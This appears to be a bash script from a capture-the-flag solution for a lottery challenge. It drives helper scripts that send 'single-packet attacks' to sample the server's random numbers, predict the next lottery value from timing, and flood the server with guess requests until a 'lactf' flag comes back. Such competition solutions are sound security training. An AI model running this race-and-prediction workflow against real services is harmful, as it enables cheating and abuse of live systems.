#!/bin/bash

# clean up environment
rm response*.txt 2>/dev/null

# How many random numbers we need to see
guesses="65"
# max requests we can put in a single packet attack
MAX_REQUESTS="250"

start_time=$(date +%s)

# Run first single packet attack to get randomness information
echo "Running single packet attack..."
./single-packet.py "$1" "$guesses" >response.txt

end_time=$(date +%s)
elapsed_time=$((end_time - start_time))

echo "Computing future lottery number..."
output=$(./exploit.py "$guesses" "$elapsed_time" "$1")

read new_lottery skips elapsed_time <<< "$output"

echo "Guess: $new_lottery"

rm response.txt

echo "Elapsed time: $elapsed_time seconds"

# Send single packet attacks until the server accepts your number
echo "Single packet attack to test future lottery number..."
for i in $(seq 0 $MAX_REQUESTS $skips); do
  echo "Attempt $i";
  if output=$(./single-packet.py "$1" "$MAX_REQUESTS" "$new_lottery" | grep -m 1 "lactf"); then
    echo "Found: $output"
    exit 0
  fi
done

echo "Not Found"
